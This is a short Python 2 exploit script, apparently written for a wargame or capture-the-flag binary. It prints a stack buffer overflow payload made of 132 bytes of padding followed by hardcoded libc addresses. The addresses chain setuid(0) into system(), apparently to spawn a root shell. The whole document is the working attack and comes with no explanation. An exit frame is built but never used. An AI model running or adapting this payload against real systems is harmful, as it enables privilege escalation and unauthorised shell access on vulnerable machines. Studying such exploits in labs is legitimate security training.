#!/usr/bin/python
import struct

padding = "A" * 132

setuid_frame  = struct.pack("<I", 0xf7ea5170)
setuid_frame += struct.pack("<I", 0x080482e9)
setuid_frame += struct.pack("<I", 0x00000000)

system_frame  = struct.pack("<I", 0xf7e2eda0)
system_frame += struct.pack("<I", 0xf7e229d0)
system_frame += struct.pack("<I", 0xf7f4f82b)

exit_frame  = struct.pack("<I", 0xf7e229d0)
exit_frame += struct.pack("<I", 0xdeadbeef)
exit_frame += struct.pack("<I", 0x00000000)

print padding + setuid_frame + system_frame
